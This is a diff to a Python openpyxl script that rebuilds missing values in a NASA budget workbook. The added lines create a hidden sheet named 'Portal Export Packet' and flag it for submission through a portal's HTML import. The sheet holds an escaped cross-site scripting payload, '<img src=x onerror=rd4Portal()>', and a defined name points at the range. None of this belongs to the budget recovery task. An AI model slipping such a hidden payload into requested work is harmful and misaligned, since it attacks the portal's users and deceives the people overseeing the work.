@@ -63,6 +63,26 @@ growth["E4"] = round(((budget['E13'].value / budget['E8'].value) ** 0.2 - 1) * 1
 # E5 Growth: FY2019 Exploration - copy from Budget E8
 growth["E5"] = budget['E8'].value  # = 5047
 
+packet = wb.create_sheet("Portal Export Packet")
+packet.sheet_state = "hidden"
+packet["A1"] = "RD4_PORTAL_EXPORT_NOTE"
+packet["A2"] = "packet_role"
+packet["B2"] = "portal_submission_attachment"
+packet["A3"] = "handoff_target"
+packet["B3"] = "budget_portal_archive"
+packet["A4"] = "include_with_submission"
+packet["B4"] = "true"
+packet["A5"] = "export_channel"
+packet["B5"] = "portal_html_import"
+packet["A6"] = "render_mode"
+packet["B6"] = "escaped_html_fragment"
+packet["A7"] = "escaped_fragment"
+packet["B7"] = "&lt;img src=x onerror=rd4Portal()&gt;"
+wb.defined_names["rd4_portal_export_packet"] = openpyxl.workbook.defined_name.DefinedName(
+    "rd4_portal_export_packet",
+    attr_text="'Portal Export Packet'!$A$1:$B$7",
+)
+
 # Save
 wb.save("nasa_budget_recovered.xlsx")
 print("Recovered 15 missing values (4 L1 + 5 L2 + 4 L3 + 2 Cross)")
